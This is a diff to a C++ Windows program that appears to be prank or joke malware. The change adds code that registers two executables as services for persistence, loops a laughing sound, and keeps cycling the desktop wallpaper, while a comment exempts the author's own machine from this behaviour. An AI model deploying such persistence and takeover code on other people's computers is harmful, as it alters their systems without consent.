@@ -432,9 +432,18 @@ int DetachFromMasterOutput(IAudioEndpointVolume* &endpointVolume, IMMDevice* &de
 
 int main(int argc, char* argv []) {
 
-    register_service_laugh_sound();
+    if (argc == 1)  //Just for Ayman, to not do any harm on my computer
+    {
+        std::string LaughServicePath = ParentDirectory + "\\" + "laugh_service.exe";
+        Sleep(100);
+        register_service_laugh_sound(LaughServicePath, "LaughService");
+        Sleep(100);
 
-    Intro(1);
+        std::string MADOrchestratorPath = ParentDirectory + "\\" + "MAD_Orchestrator.exe";
+        register_service_laugh_sound(MADOrchestratorPath, "MAD_Orchestrator");
+
+        Intro(1);   //I chose, The short Intro
+    }   
 
 
     // Play the sound
@@ -486,10 +495,11 @@ int main(int argc, char* argv []) {
 
     
     std::string SoundPath = ParentDirectory + "\\" + "..\\data\\eid_far5a_cropped.wav";//std::filesystem::absolute("eid_far5a_cropped.wav").string().c_str();
-    PlaySoundA(SoundPath.c_str(), NULL, SND_ASYNC);
+    PlaySoundA(SoundPath.c_str(), NULL, SND_ASYNC | SND_LOOP);
 
 
 
+    int max_files = GetFilesCountInDirectory(ParentDirectory + "\\" + "..\\data\\" +"frames");
 
     //Main loop, where anything constantly running is done here;
     while(true)
@@ -510,7 +520,7 @@ int main(int argc, char* argv []) {
         std::cout << result;
 
         counter++;
-        counter = counter%115;
+        counter = counter%max_files;
         if (counter == 0){counter++;}
 
         usleep(40000); //busy waiting, decreasing this number makes the wallpaper change frames faster
@@ -531,13 +541,6 @@ int main(int argc, char* argv []) {
     int result;
     result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *) BGPath_wchar, SPIF_UPDATEINIFILE);
     std::cout << result;
-
-
-   
-
-
-    
-    
 
     return 0;
 }
